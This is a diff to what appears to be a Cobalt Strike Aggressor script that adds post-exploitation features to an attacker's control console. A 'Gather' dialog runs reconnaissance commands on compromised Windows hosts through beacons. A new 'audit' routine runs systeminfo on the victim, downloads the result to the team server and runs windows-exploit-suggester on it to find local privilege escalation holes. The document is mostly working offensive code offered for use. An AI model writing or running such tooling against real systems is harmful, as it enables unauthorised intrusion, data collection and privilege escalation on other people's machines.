@@ -4,8 +4,7 @@ local('$bid');
 
 sub sysinfo{
     btask($bid, "=====Systeminfo=====", "");
-    $info = brun($bid, "whoami");
-    show_message($info);
+    bshell($bid, "systeminfo | findstr /B /C:\"OS\"");
 }
 
 sub ipconfig{
@@ -86,22 +85,55 @@ sub main{
         brun($bid,$fname);
         if ($3['redirect'] ne ""){
             show_message("You have filled in the redirection option, which will automatically download the redirection file to your team server after the script runs !");
+            sleep(5 * 1000);
             bdownload($bid, $3['redirect']);
         }
     }
 }
 
+sub audit{
+    $bid = $1['@'];
+    $fname = beacon_info($bid,"computer")."-info.txt";
+    $lpath = script_resource("temp\\ $+ $fname");
+    $suggester = script_resource("local\\windows-exploit-suggester.py");
+    $db = script_resource("local\\2020-04-10-mssb.xls");
+    $audit_fname = script_resource("logs\\".beacon_info($bid,"computer")."-audit.txt");
+    bshell($bid,"systeminfo >  $+ $fname");
+    bdownload($bid, $fname);
+    foreach %item (downloads()){
+            if (%item['name'] eq $fname){
+                $rpath = %item['lpath'];
+                sync_download($rpath, $lpath);
+            }
+        } 
+    sleep(3 * 1000);
+    if (-exists $lpath){
+        $cmd = $suggester." -i  $+ $lpath  -d  $+ $db";
+        $process = exec("cmd.exe /c ".$cmd);
+        @data = readAll($process);
+        $out = openf(">" . $audit_fname); 
+        foreach $line (@data){
+            writeb($out, $line."\r\n");
+        }         
+        closef($out);
+        closef($process);
+        deleteFile(replace($fname, "\\\\", "/"));
+        exec("cmd.exe /c start ".script_resource("logs\\"));
+        }
+    }
+
 
 #append menus
 
     menu "Gather"{
+
         item "Collector"{
             $bid = $1['@'];
             $dialog = dialog("Gather Informations",%(bid => $bid), &main);
             dialog_description($dialog, "Collect information about the target host");
             drow_checkbox($dialog, "sysinfo", "System informations", "");
             drow_checkbox($dialog, "ipconfig", "Network card configuration information", "");
-            drow_checkbox($dialog, "netstat", "Network connection list", "");
+            drow_checkbox($dialog, "netstat", "Listening port list", "");
             drow_checkbox($dialog, "software", "Installed software list", "");
             drow_checkbox($dialog, "ps_soft", "Installed software list(use powershell)", "");
             drow_checkbox($dialog, "runprocs", "Startup processes list", "");
@@ -116,5 +148,9 @@ sub main{
             drow_text($dialog, "redirect", "Script output file[optional]: ");
             dbutton_action($dialog, "Run");
             dialog_show($dialog);
+        }
+
+        item "Audit available lpe vulnerability"{
+            audit($1);
         }
     }
